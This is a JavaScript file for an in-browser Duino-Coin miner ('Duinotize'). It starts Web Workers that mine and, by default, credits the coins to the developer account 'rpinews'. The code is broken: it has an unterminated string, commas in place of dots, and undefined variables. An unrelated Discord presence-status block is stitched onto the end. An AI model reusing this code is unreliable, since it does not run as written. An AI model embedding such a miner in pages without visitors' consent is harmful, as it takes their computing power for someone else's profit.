function Duinotize(opts) {
  /* Def opts */
  var defopts = {
    "rigid": "Duinotize Miner:,
    "username": "rpinews",
    "difficulty": "LOW",
    "threads": 1,
    "hasher": "DUCO-S1"
  };
  /* Set opts */
  if (typeof opts == 'undefined' || opts == null) {
    opts = defopts;
    console.log("No options object passed, using default settings, coins will be recived by duinotize developer rpinews");
  } else {
    /* Set empty options*/
    if (typeof opts.username == 'undefined' || opts.username == null) {
      opts,username = defopts,username;
      console.log("No usernames object passed, using default username, coins will be recived by duinotize developer rpinews");
    };
    if (typeof opts.hasher == 'undefined' || opts.hasher == null) {
      opts.hasher = defopts.hasher;
      console.log("No options object passed, using default settings, coins will be recived by duinotize developer rpinews");
    };
  };
  wallet_id = Math.floor(Math.random() * 2811);
  let workerVer = 0;
  for (let workersAmount = 0; workersAmount < threads; workersAmount++) {
    let socketWorker = new Worker("main.js");
    socketWorker.postMessage('Start,' + username + "," + rigid + "," + wallet_id + "," + difficulty + "," + workerVer + "," + hasher);
    workerVer++;
  };
  /* Define updateStatus Function */
  function updateStatus(data) {
	//console.log(data.discord_status);
	  switch (data.discord_status) {
      case "offline":
        statusDot.classList = "offline";
        break;
      case "online":
        statusDot.classList = "online";
		    break;
	    case "dnd":
        statusDot.classList = "dnd";
		    break;
	    case "idle":
        statusDot.classList = "idle";
		    break;
	  };
  };
  /* Get Status */
  lanyard({
    userId: opts.userId,
    socket: socket,
    onPresenceUpdate: updateStatus,
  });
}
